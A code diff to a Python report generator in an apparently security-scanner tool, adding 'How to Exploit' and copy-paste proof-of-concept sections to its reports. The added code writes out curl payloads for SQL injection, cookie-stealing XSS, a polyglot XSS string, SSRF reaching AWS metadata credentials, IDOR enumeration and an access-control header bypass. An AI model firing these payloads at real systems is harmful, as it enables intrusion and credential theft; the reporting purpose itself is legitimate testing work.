@@ -24,7 +24,11 @@ class ReportGenerator:
     def generate_html_report(self, urls: List[str], findings: List[Finding], 
                             vuln_db: Dict[str, Any]) -> str:
         """Generate HTML report"""
-        filename = f"vulnerability_report_{self.timestamp}.html"
+        import os
+        if not os.path.exists("reports"):
+            os.makedirs("reports")
+            
+        filename = f"reports/vulnerability_report_{self.timestamp}.html"
         
         # Calculate statistics
         stats = self._calculate_stats(findings, vuln_db)
@@ -41,7 +45,11 @@ class ReportGenerator:
     def generate_txt_report(self, urls: List[str], findings: List[Finding],
                            vuln_db: Dict[str, Any]) -> str:
         """Generate plain text report"""
-        filename = f"vulnerability_report_{self.timestamp}.txt"
+        import os
+        if not os.path.exists("reports"):
+            os.makedirs("reports")
+            
+        filename = f"reports/vulnerability_report_{self.timestamp}.txt"
         
         stats = self._calculate_stats(findings, vuln_db)
         
@@ -102,6 +110,80 @@ class ReportGenerator:
                     
                     f.write(f"**💥 Real-World Impact**\n")
                     f.write(f"{vuln_info.get('real_world_impact', 'N/A')}\n\n")
+                    
+                    # ADD EXPLOITATION STEPS
+                    f.write(f"**⚔️ How to Exploit (Step-by-Step)**\n")
+                    exploitation_steps = vuln_info.get('exploitation', [])
+                    if exploitation_steps:
+                        for step in exploitation_steps:
+                            f.write(f"{step}\n")
+                    else:
+                        f.write(f"No exploitation steps available.\n")
+                    f.write(f"\n")
+                    
+                    # ADD PROOF OF CONCEPT (COPY-PASTE READY)
+                    f.write(f"**🧪 Proof of Concept (Copy & Paste)**\n")
+                    f.write(f"```bash\n")
+                    
+                    # Generate specific PoC based on vulnerability type
+                    vuln_type = finding.vuln_type
+                    url = finding.url
+                    
+                    if "SQL Injection" in vuln_type:
+                        f.write(f"# Test for SQL Injection\n")
+                        f.write(f"curl -X POST '{url}' \\\n")
+                        f.write(f"  -d \"username=admin' OR '1'='1&password=x\"\n\n")
+                        f.write(f"# Time-based blind SQLi\n")
+                        f.write(f"curl '{url}?id=1' OR SLEEP(5)--'\n\n")
+                        f.write(f"# Extract database name\n")
+                        f.write(f"curl '{url}?id=1' UNION SELECT database(),2,3--'\n")
+                    
+                    elif "XSS" in vuln_type:
+                        f.write(f"# Test for XSS\n")
+                        f.write(f"curl '{url}?q=<script>alert(1)</script>'\n\n")
+                        f.write(f"# Advanced XSS payload\n")
+                        f.write(f"curl '{url}?q=<img src=x onerror=alert(document.cookie)>'\n\n")
+                        f.write(f"# Polyglot payload\n")
+                        f.write(f"curl '{url}?q=javascript:/*--></title></style></textarea></script></xmp>\">\\\\'/*\\\"/*\\`/*\\' /*</template></noembed></noscript></title></style></script>--><svg/onload=alert(1)>'\n")
+                    
+                    elif "SSRF" in vuln_type:
+                        f.write(f"# Test for SSRF\n")
+                        f.write(f"curl '{url}?url=http://169.254.169.254/latest/meta-data/'\n\n")
+                        f.write(f"# Try to access internal services\n")
+                        f.write(f"curl '{url}?url=http://localhost:22'\n\n")
+                        f.write(f"# AWS metadata\n")
+                        f.write(f"curl '{url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n")
+                    
+                    elif "IDOR" in vuln_type:
+                        f.write(f"# Test for IDOR\n")
+                        f.write(f"curl '{url}?id=1'\n")
+                        f.write(f"curl '{url}?id=2'\n")
+                        f.write(f"curl '{url}?id=999'\n\n")
+                        f.write(f"# Try accessing admin resources\n")
+                        f.write(f"curl '{url}?uid=admin'\n")
+                    
+                    elif "Broken Access Control" in vuln_type:
+                        f.write(f"# Test for BAC\n")
+                        f.write(f"curl '{url}' \\\n")
+                        f.write(f"  -H 'X-Original-URL: /admin'\n\n")
+                        f.write(f"# Try direct access to admin endpoints\n")
+                        f.write(f"curl '{url.rsplit('/', 1)[0]}/admin/users'\n")
+                    
+                    else:
+                        f.write(f"# Manual testing required\n")
+                        f.write(f"curl -v '{url}'\n")
+                    
+                    f.write(f"```\n\n")
+                    
+                    # ADD DAMAGE POTENTIAL
+                    f.write(f"**💣 Potential Damage**\n")
+                    damage_list = vuln_info.get('damage_potential', [])
+                    if damage_list:
+                        for damage in damage_list:
+                            f.write(f"- {damage}\n")
+                    else:
+                        f.write(f"- No damage information available.\n")
+                    f.write(f"\n")
                     
                     f.write(f"**🛠️ Remediation**\n")
                     for fix in vuln_info.get('remediation', []):
